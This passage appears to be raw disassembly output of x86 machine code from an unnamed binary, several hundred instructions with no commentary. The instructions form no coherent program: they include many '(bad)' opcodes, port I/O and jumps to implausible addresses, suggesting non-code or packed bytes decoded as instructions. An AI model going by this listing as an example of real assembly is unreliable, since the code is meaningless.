  404690:	xor    esi,DWORD PTR [eax]
  404692:	push   esi
  404693:	mov    cl,0xf4
  404695:	arpl   si,bp
  404697:	inc    eax
  404698:	jmp    0x969f6fa1
  40469d:	es aad 0xee
  4046a0:	mov    ds:0x377ebd43,al
  4046a5:	pop    edx
  4046a6:	sti    
  4046a7:	push   0x82283049
  4046ac:	cld    
  4046ad:	mov    WORD PTR [esp+ebx*2],ds
  4046b0:	pop    edi
  4046b1:	push   eax
  4046b2:	mov    dl,0x59
  4046b4:	adc    ah,BYTE PTR [edi]
  4046b6:	xlat   BYTE PTR ds:[ebx]
  4046b7:	xor    BYTE PTR ds:0x2ca05478,ah
  4046bd:	in     al,0x6a
  4046bf:	xor    esi,edi
  4046c1:	scas   al,BYTE PTR es:[edi]
  4046c2:	shl    BYTE PTR [esi-0x1d],cl
  4046c5:	mov    bh,0xee
  4046c7:	dec    eax
  4046c8:	(bad)  
  4046ca:	dec    ebx
  4046cb:	dec    esp
  4046cc:	aam    0xfe
  4046ce:	sub    ebp,edx
  4046d0:	push   esp
  4046d1:	lods   eax,DWORD PTR ds:[esi]
  4046d2:	addr16 mov eax,ds:0xc3c6
  4046d6:	cmp    cl,BYTE PTR [eax-0x5e]
  4046d9:	jne    0x404703
  4046db:	push   ds
  4046dc:	pop    esi
  4046dd:	dec    eax
  4046de:	sbb    dl,bh
  4046e0:	imul   DWORD PTR [edx]
  4046e2:	jns    0x4046cc
  4046e4:	or     ah,BYTE PTR [ecx+0x61]
  4046e7:	test   dl,0x62
  4046ea:	jmp    0x67dc4c
  4046ef:	push   es
  4046f0:	add    esp,0xbf9e953f
  4046f6:	(bad)  
  4046f7:	(bad)  
  4046f8:	and    BYTE PTR [edx-0x2f3b51e7],dh
  4046fe:	outs   dx,BYTE PTR ds:[esi]
  4046ff:	add    DWORD PTR [ebx+edx*4-0x65ca1fa7],ebp
  404706:	out    dx,al
  404707:	dec    ecx
  404708:	fidivr WORD PTR [eax-0x21]
  40470b:	push   cs
  40470c:	and    BYTE PTR [ecx+0x71],bl
  40470f:	stos   BYTE PTR es:[edi],al
  404710:	jmp    0x92103557
  404715:	dec    edi
  404716:	adc    BYTE PTR [ebx],ch
  404718:	add    ah,bh
  40471a:	out    dx,al
  40471b:	and    edx,ecx
  40471d:	out    dx,eax
  40471e:	add    ebx,ebx
  404720:	sbb    al,0xa2
  404722:	push   0xffffffa1
  404724:	and    DWORD PTR [ecx+0x12],0x6ece8fc2
  40472b:	push   edx
  40472c:	pop    esi
  40472d:	dec    ebx
  40472e:	inc    esp
  40472f:	arpl   WORD PTR [edi-0x5],si
  404732:	jns    0x4046e0
  404734:	dec    edi
  404735:	popa   
  404736:	int3   
  404737:	into   
  404738:	cs (bad) 
  40473a:	loop   0x40471d
  40473c:	jecxz  0x40474d
  40473e:	out    dx,eax
  40473f:	mov    ch,0x60
  404741:	sub    ecx,DWORD PTR [edx-0x1f]
  404744:	imul   DWORD PTR [ecx+ebp*1-0x36]
  404748:	nop
  404749:	pusha  
  40474a:	xor    edi,DWORD PTR [ecx-0xa]
  40474d:	sar    BYTE PTR [eax+0x44],cl
  404750:	dec    esi
  404751:	mov    cl,0xee
  404753:	scas   al,BYTE PTR es:[edi]
  404754:	shl    DWORD PTR [eax+0x2deb079f],0xc0
  40475b:	mov    al,ds:0xe44511d9
  404760:	and    DWORD PTR [ebx],esp
  404762:	push   edi
  404763:	in     eax,dx
  404764:	push   eax
  404765:	outs   dx,DWORD PTR ds:[esi]
  404766:	inc    edx
  404767:	leave  
  404768:	pop    esi
  404769:	xchg   ebp,eax
  40476a:	xchg   ecx,eax
  40476b:	aaa    
  40476c:	mov    dl,0xbc
  40476e:	call   0x357f:0xdfe7
  404774:	mov    es,WORD PTR [esp+edi*8-0x1176c9f9]
  40477b:	push   ebp
  40477c:	jne    0x404733
  40477e:	int    0x14
  404780:	fldenv [eax+0x64]
  404783:	lds    edx,FWORD PTR [ecx-0x415766fd]
  404789:	or     BYTE PTR [eax-0x73],dl
  40478c:	pop    esi
  40478d:	lahf   
  40478e:	sub    BYTE PTR [ebx-0x5083d881],0x53
  404795:	popa   
  404796:	jle    0x40472c
  404798:	stc    
  404799:	aam    0xae
  40479b:	sub    esp,DWORD PTR [edi-0x192b11dd]
  4047a1:	sbb    BYTE PTR [eax],cl
  4047a3:	lock and eax,eax
  4047a6:	mov    ds:0x625c65ed,al
  4047ab:	sti    
  4047ac:	sbb    al,0xd1
  4047ae:	push   cs
  4047af:	mov    eax,ds:0x49ad996a
  4047b4:	jmp    0x404793
  4047b6:	out    dx,eax
  4047b7:	xor    ebx,DWORD PTR [esi]
  4047b9:	jl     0x4047a2
  4047bb:	pusha  
  4047bc:	inc    edx
  4047bd:	mov    al,0x25
  4047bf:	mov    bl,al
  4047c1:	push   ecx
  4047c2:	sub    BYTE PTR [ebx+0x3b],ah
  4047c5:	pushf  
  4047c6:	push   cs
  4047c7:	dec    esi
  4047c8:	adc    ebp,esi
  4047ca:	es or  eax,0x98b4135e
  4047d0:	je     0x4047be
  4047d2:	(bad)  
  4047d3:	dec    ecx
  4047d4:	pop    ebp
  4047d5:	popa   
  4047d6:	retf   
  4047d7:	xchg   ebx,eax
  4047d8:	pop    ebx
  4047d9:	lea    ebx,ds:0x238500cb
  4047df:	ins    DWORD PTR es:[edi],dx
  4047e0:	cdq    
  4047e1:	pop    ecx
  4047e2:	push   es
  4047e3:	scas   eax,DWORD PTR es:[edi]
  4047e4:	lock out dx,al
  4047e6:	outs   dx,BYTE PTR ds:[esi]
  4047e7:	mov    ds:0x6b3e624f,eax
  4047ec:	sub    esp,DWORD PTR [ecx-0x37]
  4047ef:	out    0xcc,eax
  4047f1:	repz cmp al,0xaa
  4047f4:	mov    dl,0xb3
  4047f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047f7:	adc    eax,0xfc9e195f
  4047fc:	mov    dh,0xd5
  4047fe:	dec    edx
  4047ff:	sbb    DWORD PTR [esi+0x2f],edx
  404802:	lahf   
  404803:	js     0x40478b
  404805:	mov    al,ds:0xde2d9a16
  40480a:	xchg   ebp,eax
  40480b:	and    bl,dh
  40480d:	aad    0x98
  40480f:	rol    BYTE PTR [edi],cl
  404811:	or     esi,ebx
  404813:	lock pop esi
  404815:	or     dl,dl
  404817:	call   FWORD PTR [ebx-0x41]
  40481a:	imul   ebx,DWORD PTR [edi+edx*8],0xf7acf460
  404821:	xchg   BYTE PTR [eax],al
  404823:	mov    cs,WORD PTR [esi]
  404825:	and    edi,esp
  404827:	scas   eax,DWORD PTR es:[edi]
  404828:	loopne 0x4047c7
  40482a:	sbb    bh,al
  40482c:	out    dx,al
  40482d:	aas    
  40482e:	cld    
  40482f:	dec    eax
  404830:	jge    0x404853
  404832:	dec    ecx
  404833:	mov    eax,ds:0x8b5d4b0b
  404838:	or     DWORD PTR [edi-0x7d],esp
  40483b:	pop    es
  40483c:	(bad)  
  40483d:	add    bh,ch
  40483f:	jecxz  0x40487b
  404841:	jp     0x404826
  404843:	sbb    BYTE PTR ds:0xf9a4a1df,al
  404849:	sub    DWORD PTR [edi],0xfffffff8
  40484c:	cmp    eax,0x3f294e76
  404851:	lods   eax,DWORD PTR ds:[esi]
  404852:	cli    
  404853:	mov    ecx,0xf32db159
  404858:	pop    esi
  404859:	pop    ds
  40485a:	dec    ecx
  40485b:	push   esp
  40485c:	push   0x487d1ef8
  404861:	popa   
  404862:	in     eax,0xac
  404864:	ret    
  404865:	addr16 jmp 0x404863
  404868:	scas   al,BYTE PTR es:[edi]
  404869:	pop    esp
  40486a:	out    dx,al
  40486b:	out    dx,eax
  40486c:	push   cs
  40486d:	jl     0x404887
  40486f:	(bad)  
  404870:	and    bl,dh
  404872:	lds    eax,FWORD PTR [ebx+edx*8-0x21ef269a]
  404879:	mov    esi,0xa474e4f0
  40487e:	and    eax,DWORD PTR [esi+ebx*2]
  404881:	adc    al,0x42
  404883:	xchg   esp,esi
  404885:	ds xchg ebp,eax
  404887:	sub    esp,DWORD PTR ds:[edx]
  40488a:	or     al,0xa2
  40488c:	adc    al,0xd2
  40488e:	dec    ebp
  40488f:	dec    esp
  404890:	and    eax,0xfe5988d1
  404895:	xchg   esi,eax
  404896:	cmc    
  404897:	add    DWORD PTR cs:[esp+ebp*4-0x49f33260],0xffffffc0
  4048a0:	shl    BYTE PTR [eax+0x6e],0xc3
  4048a4:	jl     0x4048a0
  4048a6:	scas   eax,DWORD PTR es:[edi]
  4048a7:	pusha  
  4048a8:	or     eax,0x4173eec3
  4048ad:	mov    bh,0x1e
  4048af:	push   eax
  4048b0:	addr16 (bad) 
  4048b2:	xor    esp,DWORD PTR [edx-0x10e44fb5]
  4048b8:	mov    esp,0x1a61ac50
  4048bd:	jo     0x4048e3
  4048bf:	pop    esp
  4048c0:	scas   al,BYTE PTR es:[edi]
  4048c1:	xor    ah,ah
  4048c3:	xchg   ebp,eax
  4048c4:	pop    esi
  4048c5:	pop    esi
  4048c6:	xchg   DWORD PTR [edx],edi
  4048c8:	repnz int3 
  4048ca:	push   esi
  4048cb:	jge    0x4048bd
  4048cd:	scas   al,BYTE PTR es:[edi]
  4048ce:	sub    esi,DWORD PTR [eax+0x30ee9072]
  4048d4:	mov    ebp,0xd1982e3a
  4048d9:	shl    bh,cl
  4048db:	lds    edi,FWORD PTR [ecx+eiz*2+0x19be4e63]
  4048e2:	retf   0x2289
  4048e5:	pusha  
  4048e6:	xor    BYTE PTR [ebp+0x459bc2c0],0xa7
  4048ed:	inc    eax
  4048ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048ef:	lahf   
  4048f0:	repz jp 0x4048e1
  4048f3:	lods   eax,DWORD PTR ds:[esi]
  4048f4:	and    esi,edx
  4048f6:	mov    ebx,0x5863dc5
  4048fb:	mov    eax,ds:0xee4cd462
  404900:	mov    edx,esp
  404902:	pop    dx
  404904:	pop    esi
  404905:	shld   DWORD PTR [edi],esi,0xe4
  404909:	xchg   ebx,eax
  40490a:	pop    esi
  40490b:	mov    ebp,0xe660615a
  404910:	rcl    DWORD PTR [eax],0xd1
  404913:	jnp    0x40496b
  404915:	cld    
  404916:	out    dx,al
  404917:	xchg   ebx,eax
  404918:	xor    BYTE PTR [edx],cl
  40491a:	imul   edx,DWORD PTR [ebp-0x5eeaeaa5],0xffffffa7
  404921:	test   DWORD PTR [ebx],esp
  404923:	jmp    0x4f89e2c9
  404928:	arpl   WORD PTR [esi],sp
  40492a:	or     cl,BYTE PTR [edi]
  40492c:	rol    al,1
  40492e:	mov    edi,0xee5745c
  404933:	mov    ?,WORD PTR [edx+0x42]
  404936:	cmp    BYTE PTR [ecx-0x76d6b9dc],ah
  40493c:	adc    al,0x6e
  40493e:	out    dx,al
  40493f:	cmc    
  404940:	xor    al,0x9f
  404942:	mov    bl,0x43
  404944:	inc    ecx
  404945:	add    eax,0x30db7b5b
  40494a:	mov    bh,0xa0
  40494c:	mov    ecx,0x9234b033
  404951:	or     eax,0x8453b3bc
  404956:	xor    DWORD PTR [edx],ecx
  404958:	push   ds
  404959:	jb     0x404963
  40495b:	jns    0x404947
  40495d:	push   0xf5fca30a
  404962:	and    BYTE PTR [esi-0x23],al
  404965:	(bad)  
  404966:	int    0x79
  404968:	inc    esp
  404969:	mov    ebp,0xa5e1ef4
  40496e:	mov    al,ds:0x6913a803
  404973:	std    
  404974:	retf   0x7960
  404977:	mov    ds:0xb7e3f6d7,eax
  40497c:	xor    ecx,DWORD PTR [eax-0x4af9e512]
  404982:	and    edi,esp
  404984:	rcl    BYTE PTR [edi+edi*8-0x60],cl
  404988:	iret   
  404989:	dec    esp
  40498a:	pop    ebx
  40498b:	xor    DWORD PTR [edi-0x9d8b514],edx
  404991:	cmp    al,0xe7
  404993:	jecxz  0x404a01
  404995:	xchg   ebp,eax
  404996:	mov    eax,0x8e4febf2
  40499b:	cmp    DWORD PTR [edx+0x52a92121],0x2bb26e60
  4049a5:	sti    
  4049a6:	or     bl,ch
  4049a8:	jl     0x4049eb
  4049aa:	fst    st(4)
  4049ac:	pop    esi
  4049ad:	cwde   
  4049ae:	fwait
  4049af:	pop    esp
  4049b0:	inc    edx
  4049b1:	pop    ss
  4049b2:	and    eax,DWORD PTR [edx+0x8]
  4049b5:	popa   
  4049b6:	pushf  
  4049b7:	dec    ebx
  4049b8:	pop    esp
  4049b9:	xor    edx,edi
  4049bb:	jnp    0x4049ee
  4049bd:	int3   
  4049be:	out    dx,al
  4049bf:	or     eax,0xe076e103
  4049c4:	xchg   ebx,eax
  4049c5:	sub    DWORD PTR [ecx-0x5f],eax
  4049c8:	adc    ah,BYTE PTR [ecx]
  4049ca:	sbb    al,0x7d
  4049cc:	pop    edx
  4049cd:	(bad)  
  4049ce:	repz iret 
  4049d0:	pop    esi
  4049d1:	adc    ch,bh
  4049d3:	push   ebx
  4049d4:	add    dl,BYTE PTR [ebx]
  4049d6:	push   ss
  4049d7:	push   cs
  4049d8:	inc    ecx
  4049d9:	popa   
  4049da:	push   0xffffffd3
  4049dc:	push   esp
  4049dd:	inc    esi
  4049de:	aam    0xac
  4049e0:	imul   eax,edi,0x535e0986
  4049e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049e7:	pusha  
  4049e8:	xchg   edi,eax
  4049e9:	mov    eax,DWORD PTR [esi-0x3b9f7468]
  4049ef:	in     al,dx
  4049f0:	pop    ecx
  4049f1:	imul   edi,ebx,0x4c
  4049f4:	ror    BYTE PTR [eax-0x3860fb12],1
  4049fa:	pushf  
  4049fb:	cdq    
  4049fc:	imul   ebx,eax,0xffffffbe
  4049ff:	mov    al,ds:0x19d32395
  404a04:	inc    BYTE PTR [esi]
  404a06:	outs   dx,BYTE PTR ds:[esi]
  404a07:	push   edi
  404a08:	pop    esi
  404a09:	ins    BYTE PTR es:[edi],dx
  404a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a0b:	mov    esi,0xf8bc270f
  404a10:	mov    BYTE PTR [eax+0x59],ah
  404a13:	call   0x47ea:0x4993cdbe
  404a1a:	out    dx,al
  404a1b:	sbb    BYTE PTR [edx+0x1a],al
  404a1e:	jae    0x404a71
  404a20:	int    0x46
  404a22:	inc    edi
  404a23:	xchg   DWORD PTR [edx],ecx
  404a25:	sub    DWORD PTR [ebp-0x64],ebx
  404a28:	jbe    0x4049df
  404a2a:	popa   
  404a2b:	test   DWORD PTR [esi+0x3f],ebx
  404a2e:	mov    al,ds:0xee99271a
  404a33:	push   esi
  404a34:	dec    edi
  404a35:	and    ah,BYTE PTR [esi]
  404a37:	les    edi,FWORD PTR [ebx-0x5d0b2546]
  404a3d:	pop    edi
  404a3e:	xor    al,0x62
  404a40:	ja     0x404a8a
  404a42:	or     ch,BYTE PTR [eax-0x6759cef9]
  404a48:	je     0x404ac5
  404a4a:	(bad)  
  404a4c:	push   ecx
  404a4d:	fwait
  404a4e:	pop    esi
  404a4f:	in     eax,dx
  404a50:	fisub  WORD PTR [edx-0x1ace5482]
  404a56:	adc    esp,DWORD PTR [ecx+0x3652d4d1]
  404a5c:	jbe    0x404a95
  404a5e:	sub    BYTE PTR [esi+0x78],bh
  404a61:	push   edx
  404a62:	out    dx,al
  404a63:	call   0xbbc9:0xcc574f53
  404a6a:	test   al,0xaf
  404a6c:	sbb    eax,0xa51c6fa2
  404a71:	fild   QWORD PTR [esi-0x6f812ea1]
  404a77:	jmp    0xae6aafda
  404a7c:	mov    BYTE PTR [ecx-0x3a],ah
  404a7f:	pop    ebp
  404a80:	sub    ah,BYTE PTR [ecx+0x49]
  404a83:	dec    edx
  404a84:	repz test eax,0x4e48bf0e
  404a8a:	push   ss
  404a8b:	(bad)  
  404a8c:	or     bl,BYTE PTR [ebp-0x13a181aa]
  404a92:	sub    al,BYTE PTR [eax+edx*2+0x33]
  404a96:	sahf   
  404a97:	fcom   QWORD PTR [ebx]
  404a99:	popa   
  404a9a:	jns    0x404a3a
  404a9c:	dec    ebp
  404a9d:	pop    esp
  404a9e:	sbb    eax,0x9df84
  404aa3:	icebp  
  404aa4:	or     eax,0x3c816e45
  404aa9:	retf   0x9791
  404aac:	add    al,0x5e
  404aae:	(bad)  [ebp-0x4]
  404ab1:	sbb    dl,bh
  404ab3:	push   ebp
  404ab4:	ins    DWORD PTR es:[edi],dx
  404ab5:	xchg   esp,eax
  404ab6:	jns    0x404ae0
  404ab8:	mov    ?,WORD PTR [edx-0x6612d181]
  404abe:	(bad)  
  404abf:	dec    BYTE PTR [edx+0x688d72d5]
  404ac5:	sahf   
  404ac6:	xor    cl,ah
  404ac8:	bnd jge 0x404b38
  404acb:	into   
  404acc:	dec    edx
  404acd:	jbe    0x404abd
  404acf:	xchg   esi,eax
  404ad0:	and    ecx,DWORD PTR [ecx-0x6c]
  404ad3:	ss push 0x76
  404ad6:	in     al,0xa0
  404ad8:	outs   dx,BYTE PTR ds:[esi]
  404ad9:	fdiv   DWORD PTR [eax+0x4e8640ed]
  404adf:	push   ebp
  404ae0:	pop    edx
  404ae1:	out    0x69,eax
  404ae3:	add    BYTE PTR [edx+0x40],dl
  404ae6:	add    bh,BYTE PTR cs:[esi-0x425e8d78]
  404aed:	pop    eax
  404aee:	fisttp QWORD PTR [esi]
  404af0:	sub    BYTE PTR [esi-0xea4380b],al
  404af6:	bound  esi,QWORD PTR ds:0xe12fe947
  404afc:	les    ebp,FWORD PTR ds:0xacbc8edf
  404b02:	repnz mov al,ds:0x13c832cd
  404b08:	mov    edx,0x16091017
  404b0d:	cmp    dl,ch
  404b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b10:	mov    ah,0x82
  404b12:	add    ax,0xe09e
  404b16:	daa    
  404b17:	lds    edi,FWORD PTR [ecx+eiz*2]
  404b1a:	in     eax,0x9b
  404b1c:	push   esp
  404b1d:	inc    eax
  404b1e:	inc    ecx
  404b1f:	dec    ecx
  404b20:	mov    BYTE PTR [ecx+0x4cf28cf3],al
  404b26:	pop    ecx
  404b27:	mov    eax,ds:0x918ee376
  404b2c:	fwait
  404b2d:	pop    edi
  404b2e:	nop
  404b2f:	bnd jle 0x404b01
  404b32:	call   0xcd6c:0xb2fb6f6
  404b39:	and    BYTE PTR [edx],0xf1
  404b3c:	fistp  QWORD PTR [ebx]
  404b3e:	out    dx,al
  404b3f:	int    0x44
  404b41:	inc    ebp
  404b42:	adc    DWORD PTR [edi],ebx
  404b44:	nop
  404b45:	push   0x609e6ecd
  404b4a:	and    al,0x5d
  404b4c:	push   edi
  404b4d:	out    0x1c,al
  404b4f:	xchg   ebp,eax
  404b50:	xor    ah,bl
  404b52:	out    dx,al
  404b53:	rol    dh,cl
  404b55:	xchg   ebx,eax
  404b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b57:	adc    eax,0xa105ff7c
  404b5c:	jecxz  0x404b86
  404b5e:	icebp  
  404b5f:	push   cs
  404b60:	or     al,0x89
  404b62:	or     eax,0x8c995e1a
  404b67:	cli    
  404b68:	mov    dl,0x35
  404b6a:	pop    edi
  404b6b:	pop    esi
  404b6c:	js     0x404bd4
  404b6e:	(bad)  
  404b6f:	dec    edi
  404b70:	mov    dl,0x66
  404b72:	adc    al,BYTE PTR [ecx]
  404b74:	add    DWORD PTR [ecx-0x79],esp
  404b77:	jbe    0x404b23
  404b79:	shl    DWORD PTR [eax+0x7c445ef1],1
  404b7f:	mov    ch,0x25
  404b81:	mov    eax,0x56597922
  404b86:	addr16 xchg ecx,eax
  404b88:	ins    BYTE PTR es:[edi],dx
  404b89:	mov    edx,0xdb4b796e
  404b8e:	xchg   ebp,eax
  404b8f:	xor    eax,0xaaf10b5e
  404b94:	xchg   ebx,eax
  404b95:	(bad)  [edi+0x29424856]
  404b9b:	mov    ah,0xe0
  404b9d:	fist   WORD PTR [edx-0x23491619]
  404ba3:	jl     0x404bb8
  404ba5:	shr    dh,1
  404ba7:	jb     0x404c0f
  404ba9:	retf   0xebd1
  404bac:	adc    BYTE PTR [edi+ecx*2],0x77
  404bb0:	adc    eax,0x606a1e53
  404bb5:	rcr    DWORD PTR [edi+0x2a0f62e1],0x72
  404bbc:	popa   
  404bbd:	loope  0x404ba6
  404bbf:	lods   eax,DWORD PTR ds:[esi]
  404bc0:	ins    BYTE PTR es:[edi],dx
  404bc1:	(bad)  
  404bc2:	lea    esi,[esi]
  404bc4:	mov    esi,0x554f7386
  404bc9:	popa   
  404bca:	mov    cl,0xb3
  404bcc:	mov    cl,0xde
  404bce:	pop    ss
  404bcf:	ins    DWORD PTR es:[edi],dx
  404bd0:	lods   eax,DWORD PTR ds:[esi]
  404bd1:	sub    ebp,0x25b34396
  404bd7:	ss ss inc esi
  404bda:	cs in  al,0xab
  404bdd:	and    ch,BYTE PTR [eax+eiz*4-0x438b0cc3]
  404be4:	sbb    ebx,edx
  404be6:	jb     0x404b98
  404be8:	pop    esi
  404be9:	repnz adc eax,0x50b760bb
  404bef:	nop
  404bf0:	outs   dx,DWORD PTR ds:[esi]
  404bf1:	pop    ecx
  404bf2:	push   ds
  404bf3:	sahf   
  404bf4:	mov    bl,0xb1
  404bf6:	xor    al,0x31
  404bf8:	(bad)  
  404bf9:	cmp    BYTE PTR [edx+0x25],dh
  404bfc:	pop    ebp
  404bfd:	stos   DWORD PTR es:[edi],eax
  404bfe:	out    dx,eax
  404bff:	pusha  
  404c00:	rol    cl,0xd8
  404c03:	push   esp
  404c04:	xchg   edx,eax
  404c05:	xor    BYTE PTR [eax],dl
  404c07:	mov    eax,ds:0x4a7b893a
  404c0c:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  404c0e:	scas   al,BYTE PTR es:[edi]
  404c0f:	or     al,0x60
  404c11:	lahf   
  404c12:	jle    0x404bc5
  404c14:	mov    dl,0xbd
  404c16:	mov    cl,0x20
  404c18:	mov    ecx,0x6938b8fd
  404c1d:	pop    ebp
  404c1e:	mov    al,ds:0xe0c358e7
  404c23:	and    ah,dh
  404c25:	add    al,0xb2
  404c27:	xchg   edx,eax
  404c28:	push   cs
  404c29:	pop    eax
  404c2a:	jge    0x404c39
  404c2c:	pop    esi
  404c2d:	daa    
  404c2e:	aam    0x85
  404c30:	mov    eax,0xa04f0387
  404c35:	pusha  
  404c36:	shr    BYTE PTR [esi-0x78f58f5e],0xe1
  404c3d:	mov    ebp,0x56372df0
  404c42:	ds mov al,0xdb
  404c45:	pop    esp
  404c46:	outs   dx,BYTE PTR ds:[esi]
  404c47:	jmp    0x5b7c:0xb5dd3dbe
  404c4e:	es pop esp
  404c50:	mov    edx,0x98a07e14
  404c55:	aam    0x4e
  404c57:	push   ebx
  404c58:	add    al,0x89
  404c5a:	ins    DWORD PTR es:[edi],dx
  404c5b:	ja     0x404cc0
  404c5d:	pop    eax
  404c5e:	pop    ecx
  404c5f:	jb     0x404bef
  404c61:	add    BYTE PTR [eax-0x70],dh
  404c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c65:	push   eax
  404c66:	sbb    BYTE PTR [edx-0x1a3095aa],ah
  404c6c:	sbb    eax,0xad695536
  404c71:	push   edx
  404c72:	out    dx,al
  404c73:	jle    0x404c47
  404c75:	cmp    bl,cl
  404c77:	pop    edi
  404c78:	push   cs
  404c79:	xlat   BYTE PTR ds:[ebx]
  404c7a:	pop    edi
  404c7b:	mov    al,ds:0xb00b5f02
  404c80:	pop    ebp
  404c81:	xchg   ebx,eax
  404c82:	bound  edx,QWORD PTR [ecx+ebp*2-0x50]
  404c86:	dec    ebp
  404c87:	lods   eax,DWORD PTR ds:[esi]
  404c88:	pop    ebp
  404c89:	push   esp
  404c8a:	push   eax
  404c8b:	enter  0x3353,0xc2
  404c8f:	mov    eax,ds:0x8576e272
  404c94:	and    ebx,DWORD PTR [ecx]
  404c96:	or     al,0xb4
  404c98:	pop    esi
  404c99:	inc    edi
  404c9a:	jl     0x404d02
  404c9c:	out    dx,eax
  404c9d:	pop    edx
  404c9e:	aad    0x57
  404ca0:	addr16 xor al,0x98
  404ca3:	and    eax,DWORD PTR [eax-0x41ea98a7]
  404ca9:	jecxz  0x404c40
  404cab:	xchg   ebp,edi
  404cad:	pusha  
  404cae:	aam    0xb4
  404cb0:	xlat   BYTE PTR ds:[ebx]
  404cb1:	retf   
  404cb2:	inc    esi
  404cb3:	popa   
  404cb4:	or     ecx,0xa1c8e6ee
  404cba:	add    bh,BYTE PTR [edi-0x5b7ba8a4]
  404cc0:	fidivr DWORD PTR [ecx]
  404cc2:	adc    cl,BYTE PTR [edi]
  404cc4:	inc    ebx
  404cc5:	shr    BYTE PTR [esi],0x3
  404cc8:	mov    ebp,DWORD PTR [ecx+0x60b50ee]
  404cce:	sub    DWORD PTR [edi+eiz*8+0x50],ebx
  404cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cd3:	scas   eax,DWORD PTR es:[edi]
  404cd4:	rol    DWORD PTR [esi],cl
  404cd6:	outs   dx,BYTE PTR ds:[esi]
  404cd7:	out    dx,eax
  404cd8:	mov    eax,ds:0x467db93c
  404cdd:	in     eax,dx
  404cde:	hlt    
  404cdf:	scas   eax,DWORD PTR es:[edi]
  404ce0:	inc    ecx
  404ce1:	xor    eax,0x6a5e14a9
  404ce6:	into   
  404ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ce8:	in     eax,0x29
  404cea:	out    0xa0,eax
  404cec:	mov    ds:0xee626a8a,eax
  404cf1:	out    dx,al
  404cf2:	pop    edi
  404cf3:	jns    0x404d53
  404cf5:	fist   WORD PTR [ebp+0x1d22600b]
  404cfb:	sahf   
  404cfc:	mov    ds:0x6e2be85f,al
  404d01:	xor    eax,0x3072f419
  404d06:	xchg   esi,eax
  404d07:	push   cs
  404d08:	test   BYTE PTR [eax-0x7e03c712],ch
  404d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d0f:	fld    QWORD PTR [esi+0x47a167f3]
  404d15:	ret    
  404d16:	sbb    al,ch
  404d18:	dec    ebp
  404d19:	jnp    0x404d5b
  404d1b:	pop    eax
  404d1c:	pop    esi
  404d1d:	cmp    eax,0xe0dd8ad7
  404d22:	aas    
  404d23:	ret    0x6008
  404d26:	das    
  404d27:	stos   BYTE PTR es:[edi],al
  404d28:	or     al,0xbd
  404d2a:	imul   esp,ecx,0xffffffe1
  404d2d:	rcl    BYTE PTR [ecx+0x25dc8471],0x9a
  404d34:	call   0x5aae419
  404d39:	sub    DWORD PTR [ecx+0x17],ecx
  404d3c:	shl    BYTE PTR [eax+0x6c],1
  404d3f:	mov    ds:0x50b82bb1,al
  404d44:	jbe    0x1f7a7539
  404d4a:	xchg   ecx,esp
  404d4c:	ja     0x404cf5
  404d4e:	push   ebp
  404d4f:	(bad)  [ebx+0x61]
  404d52:	xchg   ebp,eax
  404d53:	jmp    0x4327:0x6f5a92c4
  404d5a:	add    ebp,edi
  404d5c:	mov    al,ds:0x12acaebf
  404d61:	das    
  404d62:	push   esi
  404d63:	in     al,dx
  404d64:	inc    BYTE PTR [eax]
  404d66:	push   eax
  404d67:	xchg   esp,eax
  404d68:	and    esp,DWORD PTR [ecx+0x67]
  404d6b:	out    dx,al
  404d6c:	push   edx
  404d6d:	push   ebx
  404d6e:	inc    ecx
  404d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d70:	push   0xffffffe3
  404d72:	push   es
  404d73:	das    
  404d74:	repz ror BYTE PTR [esi-0x2],0x14
  404d79:	pop    edx
  404d7a:	scas   eax,DWORD PTR es:[edi]
  404d7b:	sbb    al,0x46
  404d7d:	push   0x99dff25c
  404d82:	in     eax,0xb0
  404d84:	fdivr  st,st(7)
  404d86:	out    dx,al
  404d87:	rcr    DWORD PTR [edi],1
  404d89:	js     0x404d80
  404d8b:	aam    0x54
  404d8d:	xchg   esp,edx
  404d8f:	je     0x404d46
  404d91:	pop    ecx
  404d92:	adc    ecx,ecx
  404d94:	fidivr WORD PTR [ebp+0x3c]
  404d97:	bound  edx,QWORD PTR [ebp-0x45]
  404d9a:	add    DWORD PTR [ecx+0x2a],esp
  404d9d:	fist   DWORD PTR [edx-0xe]
  404da0:	xor    bh,al
  404da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404da3:	and    eax,edi
  404da5:	pop    es
  404da6:	dec    edx
  404da7:	jnp    0x404dcd
  404da9:	pop    edx
  404daa:	mov    ax,ds:0xf59c11f6
  404db0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404db1:	or     al,0x76
  404db3:	adc    DWORD PTR [edx+0x6],edx
  404db6:	push   esi
  404db7:	sub    al,0xde
  404db9:	mov    dh,0x97
  404dbb:	popf   
  404dbc:	push   es
  404dbd:	ret    
  404dbe:	hlt    
  404dbf:	xchg   BYTE PTR [edi+0x4ffc3360],dl
  404dc5:	sahf   
  404dc6:	mov    ebp,0xfc44a8b9
  404dcb:	pop    ss
  404dcc:	daa    
  404dcd:	mov    al,ds:0xa4e44ee
  404dd2:	lods   eax,DWORD PTR ds:[esi]
  404dd3:	dec    ebx
  404dd4:	aad    0x60
  404dd6:	push   edi
  404dd7:	mov    dl,0x7c
  404dd9:	iret   
  404dda:	pop    ebp
  404ddb:	jbe    0x404e06
  404ddd:	push   ebx
  404dde:	and    al,0x90
  404de0:	sbb    ah,BYTE PTR [esi]
  404de2:	and    ecx,DWORD PTR [esi+0x6c]
  404de5:	pop    ecx
  404de6:	push   edx
  404de7:	in     al,dx
  404de8:	jle    0x404db6
  404dea:	into   
  404deb:	inc    edi
  404dec:	cmp    ah,BYTE PTR [edi-0x6d]
  404def:	fldenv [ecx-0x52b111a]
  404df5:	sar    BYTE PTR [ebp-0x118f0189],1
  404dfb:	mov    dh,0x2b
